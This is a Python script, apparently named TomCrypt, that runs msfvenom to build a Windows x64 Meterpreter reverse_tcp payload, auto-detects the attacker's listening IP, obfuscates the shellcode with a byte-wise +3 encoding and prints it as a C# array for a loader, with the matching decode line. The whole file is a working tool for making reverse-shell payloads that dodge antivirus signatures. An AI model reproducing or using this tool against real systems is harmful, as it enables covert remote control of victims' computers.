#!/usr/bin/env python3
import argparse
import subprocess
import re
import sys
import socket
import os

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        pass
    try:
        out = subprocess.check_output(
            "ip route get 1.1.1.1 | awk '{print $7}'", 
            shell=True, stderr=subprocess.DEVNULL
        ).decode().strip()
        if re.match(r'\d+\.\d+\.\d+\.\d+', out):
            return out
    except:
        pass
    return None

def main():
    parser = argparse.ArgumentParser(
        description="TomCrypt - msfvenom + automatic +3 shellcode encryption"
    )
    parser.add_argument("-p", "--payload", 
                        default="windows/x64/meterpreter/reverse_tcp",
                        help="Payload to use")
    parser.add_argument("-H", "--lhost", default=None,
                        help="Your IP / LHOST (auto-detected if not given)")
    parser.add_argument("-P", "--lport", type=int, default=4444,
                        help="LPORT (default: 4444)")
    parser.add_argument("-o", "--output", default=None,
                        help="Save output to a file")
    parser.add_argument("--raw", action="store_true",
                        help="Also save raw encrypted bytes as .bin")
    args = parser.parse_args()

    print("[+] TomCrypt starting...")

    lhost = args.lhost
    if not lhost:
        lhost = get_local_ip()
        if lhost:
            print(f"[*] Auto-detected LHOST: {lhost}")
        else:
            print("[-] Could not auto-detect LHOST. Please use -H <your-ip>")
            sys.exit(1)

    print(f"    Payload : {args.payload}")
    print(f"    LHOST   : {lhost}")
    print(f"    LPORT   : {args.lport}")

    msf_cmd = [
        "msfvenom",
        "-p", args.payload,
        f"LHOST={lhost}",
        f"LPORT={args.lport}",
        "-f", "csharp"
    ]

    print("[*] Running msfvenom in the background...")
    try:
        result = subprocess.run(msf_cmd, capture_output=True, text=True, timeout=120)
    except FileNotFoundError:
        print("[-] msfvenom not found. Install it with: sudo apt install metasploit-framework")
        sys.exit(1)

    if result.returncode != 0:
        print("[-] msfvenom failed:\n" + result.stderr)
        sys.exit(1)

    matches = re.findall(r'0x([0-9a-fA-F]{1,2})', result.stdout)
    if not matches:
        print("[-] Failed to parse shellcode from msfvenom output")
        sys.exit(1)

    original = [int(m, 16) for m in matches]
    print(f"[+] msfvenom generated {len(original)} bytes")

    # === +3 Encryption (same as your HollowEncryptor) ===
    encoded = [(b + 3) & 0xFF for b in original]

    # Format nicely (12 bytes per line)
    lines = []
    for i in range(0, len(encoded), 12):
        line = ", ".join(f"0x{b:02x}" for b in encoded[i:i+12])
        lines.append(line)
    body = ",\n    ".join(lines)

    output = f"""// ============================================
// TomCrypt - Encrypted Shellcode (+3)
// ============================================
// Payload  : {args.payload}
// LHOST    : {lhost}
// LPORT    : {args.lport}
// Length   : {len(encoded)} bytes
// Encryption: Add +3 (mod 256)
// ============================================

byte[] buf = new byte[{len(encoded)}] {{
    {body}
}};
"""

    print("\n=== COPY ENCRYPTED SHELLCODE ===")
    print(output)
    print("=== END ===\n")

    if args.output:
        with open(args.output, "w") as f:
            f.write(output)
        print(f"[+] Saved to {args.output}")

    if args.raw:
        rawfile = (os.path.splitext(args.output)[0] if args.output else "shellcode") + ".bin"
        with open(rawfile, "wb") as f:
            f.write(bytes(encoded))
        print(f"[+] Raw encrypted bytes saved to {rawfile}")

    print("[i] In your loader/decrypter use:  buf[i] = (encoded[i] - 3) & 0xFF")

if __name__ == "__main__":
    main()
